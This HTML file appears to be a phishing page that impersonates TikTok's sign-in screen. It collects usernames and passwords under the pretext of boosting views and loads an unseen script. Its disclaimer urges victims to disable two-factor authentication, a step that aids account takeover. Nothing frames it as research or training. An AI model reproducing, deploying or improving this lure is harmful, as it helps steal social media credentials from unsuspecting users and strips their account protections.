<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok Sign In</title>
  <link rel="stylesheet" href="/static/styles.css">
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/TikTok_logo.svg/1200px-TikTok_logo.svg.png" alt="TikTok Bump">
    </div>
    <h2>Sign in to TikTok</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email or username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
    <p class="forgot-password"><a href="#">Forgot password?</a></p>
    <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
    <p class="disclaimer">This site bumps your views and activity to your tiktok account, make sure you dissable 2fa since our api cant handel that yet....</p>
  </div>
  <script src="/app.js"></script>
</body>
</html>
